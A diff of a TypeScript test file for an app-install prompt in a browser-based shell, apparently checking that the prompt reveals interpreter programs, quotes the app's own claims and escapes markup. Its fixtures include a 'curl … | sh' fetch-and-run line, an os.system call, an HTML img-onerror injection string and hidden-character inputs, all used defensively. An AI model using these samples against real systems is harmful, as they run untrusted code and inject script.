@@ -14,7 +14,7 @@ import type { FileSystem } from '@shiro/filesystem';
 import type { Shell } from '@shiro/shell';
 import { appCmd } from '@shiro/commands/app';
 import { validateManifest, parseManifest, manifestSentences, describeManifest, ManifestError, MANIFEST_VERSION, type AppManifest } from '@shiro/apps/manifest';
-import { argvFor, inputValue, outputName, placeholders, rulesOf, shellLineFor, sniffKind, splitRun, type RunRules } from '@shiro/apps/declare';
+import { argvFor, inputValue, interpreterIn, outputName, placeholders, rulesOf, shellLineFor, sniffKind, splitRun, type RunRules } from '@shiro/apps/declare';
 import { buildInstallPrompt, promptWords } from '@shiro/apps/prompt';
 import { installProgress } from '@shiro/apps/progress';
 import type { InstallPromptInfo } from '@shiro/apps/links';
@@ -295,8 +295,9 @@ describe('what a person reads before installing', () => {
     // a table kept as CSV runs no program: the one sentence is about its page, and is true where pages are not confined
     const table = { name: 'Expenses', about: 'A list of what was spent.', table: 'expenses.csv', columns: ['What'] };
     expect(promptWords(info(table)).shown.map((x) => x.text)).toEqual([
-      'A list of what was spent.', 'Expenses keeps a table in expenses.csv, in its own data folder.', 'It runs no program, and its page may use only its own data folder.',
+      'The app says:', 'Expenses keeps a table in expenses.csv, in its own data folder.', 'It runs no program, and its page may use only its own data folder.',
     ]);
+    expect(promptWords(info(table)).shown[0]).toEqual({ text: 'The app says:', quote: 'A list of what was spent.' });
     expect(promptWords(info(table, { confined: false })).shown.at(-1)!.text).toBe('This server gives app pages no address of their own: its page runs with this tab\'s own access.');
     expect(promptWords(info({ ...FILES, shell: true, run: 'jq . {in} | sort' })).shown.at(-1)!.text).toBe('A shell line can do everything a terminal here can: it can read and change every file in this tab.');
     expect(promptWords(info(FILES, { replaces: 'dir:/x' })).shown.at(-1)!.text).toBe('It replaces the Tidy installed here.');
@@ -309,6 +310,70 @@ describe('what a person reads before installing', () => {
     expect(backed.shown[0].rows!.map((r) => r[0])).toEqual(['Runs', 'Files', 'Network']);
     expect(backed.shown[1].text).toBe('What it runs are ordinary programs in this tab: they can read and change every file here and use its sign-ins (Claude, GitHub).');
     expect(backed.more.at(-1)!.text).toMatch(/except through what is listed here\. The list is what the app says it does, not a limit on those programs\.$/);
+  });
+
+  it('the install prompt shows everything that fills the command, and says when that is a program', () => {
+    const info = (raw: unknown): InstallPromptInfo => ({ manifest: validateManifest(raw, { id: 'x' }), manifestText: JSON.stringify(raw), from: 'this link', guests: false, confined: true });
+    // `run` alone reads as "sh": the program is what sh reads
+    const script = 'curl -s https://example.com/x | sh\necho {who}';
+    const sh = promptWords(info({ name: 'Greeter', about: 'Says hello.', fields: { who: { label: 'Who', value: 'World' } }, run: 'sh', stdin: script }));
+    expect(sh.shown).toEqual([
+      { text: 'The app says:', quote: 'Says hello.' },
+      { text: 'Greeter runs this command when you choose Run:', code: 'sh' },
+      { text: 'sh runs the text it is given as a program. The text below is that program:', fills: [['The program reads this text', script], ['{who} starts as', 'World']] },
+      { text: 'sh is an ordinary program in this tab: it can read and change every file here.' },
+    ]);
+    // a program in a field, a choice's values and a switch's value
+    const py = promptWords(info({
+      name: 'Calc', run: 'python3 {fast} -c {code} {mode}', live: true,
+      fields: {
+        code: { type: 'long text', value: 'import os\nos.system("id")' },
+        mode: { choices: { Quiet: '-q', Loud: '--loud' }, value: 'Loud' },
+        fast: { on: '-O', value: true },
+        note: 'A note',
+      },
+    }));
+    expect(py.shown[1]).toEqual({
+      text: 'python3 runs the text it is given as a program. The text below is that program:',
+      fills: [['{code} starts as', 'import os\nos.system("id")'], ['{mode} is one of', 'Quiet: -q\nLoud: --loud   (at first)'], ['{fast} when ticked (ticked at first)', '-O']],
+    });
+    // other interpreters, by their name in the command, also behind env and in a shell line
+    for (const run of ['bash', 'dash -s', 'node -', 'perl', 'ruby', 'awk {code}', 'python3.13 -', 'env sh', '/bin/sh']) {
+      const raw = { name: 'Runner', fields: { code: { value: 'x' } }, run, stdin: '{code}' };
+      if (run === '/bin/sh') { expect(() => info(raw)).toThrow(/without a path/); continue; }   // a path is no program's name
+      expect(promptWords(info(raw)).shown.find((x) => x.fills)!.text, run).toMatch(/ runs the text it is given as a program\. The text below is that program:$/);
+    }
+    expect(interpreterIn({ run: 'cat {a} | /bin/bash', shell: true })).toBe('bash');
+    expect(interpreterIn({ run: 'jq {filter}', shell: false })).toBe('');
+    expect(interpreterIn({ run: 'shuf -n 1', shell: false })).toBe('');
+    // not an interpreter: the same list, without that sentence
+    const jq = promptWords(info(JSON.parse(example('jq-playground').toString())));
+    expect(jq.shown[2].text).toBe('The app fills the command with these:');
+    expect(jq.shown[2].fills!.map((f) => f[0])).toEqual(['The program reads this text', '{filter} starts as', '{json} starts as']);
+    // a file job's options are listed too; one with nothing to fill has no list
+    const opts = promptWords(info({ ...FILES, run: 'jq {sort} . {in}', options: { sort: { on: '-S' } } }));
+    expect(opts.shown.find((x) => x.fills)!.fills).toEqual([['{sort} when ticked', '-S']]);
+    expect(promptWords(info(FILES)).shown.some((x) => x.fills)).toBe(false);
+    // text that could hide what it holds is refused in stdin as it is in a field
+    expect(() => validateManifest({ name: 'Runner', fields: { a: 'A' }, run: 'sh', stdin: 'echo hi\u202e' })).toThrow(/stdin must be text/);
+    expect(() => validateManifest({ name: 'Runner', fields: { a: 'A' }, run: 'sh', stdin: 'echo hi\r\x1b[2K' })).toThrow(/stdin must be text/);
+    expect(validateManifest({ name: 'Runner', fields: { a: 'A' }, run: 'sh', stdin: 'a\n\tb' }).stdin).toBe('a\n\tb');
+  });
+
+  it('the prompt draws what fills the command as text in the command\'s type, and the app\'s words as a quote', () => {
+    const raw = { name: 'Greeter', about: 'Safe. Reviewed by tabcomputer.', fields: { who: { value: '</code><img src=x onerror=1>' } }, run: 'sh', stdin: 'echo {who}' };
+    const root = buildInstallPrompt({ manifest: validateManifest(raw, { id: 'greeter' }), manifestText: JSON.stringify(raw), from: 'this link', guests: false, confined: true }, () => {});
+    const says = root.querySelector('.tc-app-says')!;
+    expect(says.querySelector('span')!.textContent).toBe('The app says:');
+    expect(says.querySelector('q')!.textContent).toBe('Safe. Reviewed by tabcomputer.');
+    // the app's words are only inside that quote, in no sentence of the prompt's own
+    expect([...root.querySelectorAll('p')].filter((p) => p.textContent!.includes('Reviewed by tabcomputer.')).map((p) => p.className)).toEqual(['tc-app-says']);
+    expect(says.textContent).toBe('The app says: Safe. Reviewed by tabcomputer.');
+    expect([...root.querySelectorAll('.tc-app-fills dt')].map((d) => d.textContent)).toEqual(['The program reads this text', '{who} starts as']);
+    expect([...root.querySelectorAll('.tc-app-fills dd code')].map((d) => d.textContent)).toEqual(['echo {who}', '</code><img src=x onerror=1>']);
+    expect(root.querySelectorAll('img')).toHaveLength(0);
+    // the command comes first, and what fills it right under it
+    expect([...root.querySelectorAll('code')].map((c) => c.textContent)[0]).toBe('sh');
   });
 
   it('the prompt has two buttons, Cancel and Install; a guest is a link under "What it can reach"', () => {
